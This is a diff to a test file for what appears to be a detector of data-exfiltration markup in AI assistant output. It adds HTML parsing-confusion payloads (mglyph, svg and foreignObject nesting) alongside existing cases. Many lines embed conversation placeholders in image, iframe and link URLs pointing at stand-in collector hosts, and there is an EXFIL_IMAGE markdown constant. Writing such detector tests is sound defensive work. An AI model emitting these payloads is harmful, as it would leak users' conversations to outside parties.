@@ -351,7 +351,10 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
             ),
             ["exfiltration_query"],
         ),
-        ("<math><mi><mglyph><template><img src='https://collector.test/{c}.png'>", ["exfiltration_query"]),
+        (
+            "<math><mi><mglyph><template><img src='https://collector.test/{c}.png'>",
+            ["exfiltration_query", "uncheckable_markup"],
+        ),
         ("<math><mi><template><img src='https://collector.test/{c}.png'></template></mi></math>", []),
         ("<input type='text' formaction='https://collector.test/?q={c}'>", []),
         ("<input type='submit' formaction='https://collector.test/?q={c}'>", ["exfiltration_query"]),
@@ -423,6 +426,20 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
         ),
         ("<base href='https://['><img src='/{c}.png'>", []),
         ("<link rel='canonical' href='https://a.test/{c}'>", []),
+        (
+            "<div><mi><mglyph><iframe src='https://collector.test/{c}'></iframe></mglyph></mi></div>",
+            ["exfiltration_query"],
+        ),
+        (
+            "<div><svg><foreignObject><p></foreignObject><iframe src='https://collector.test/{c}'></iframe></svg></div>",
+            ["uncheckable_markup"],
+        ),
+        (
+            "<svg><desc><span>x</svg><img src='https://collector.test/{c}.png'>",
+            ["exfiltration_query", "uncheckable_markup"],
+        ),
+        ("<svg><g><circle></svg><img src='https://collector.test/{c}.png'>", ["exfiltration_query"]),
+        ("<div><span><b>x</div><a href='https://a.test/'>a</a>", []),
         ("<link rel='dns-prefetch' href='//{conversation}.collector.test'>", ["exfiltration_query"]),
         ("<link rel='Preconnect' href='https://{c}.collector.test/'>", ["exfiltration_query"]),
         ("<link rel='preconnect' href='https://u:{c}@collector.test/'>", []),
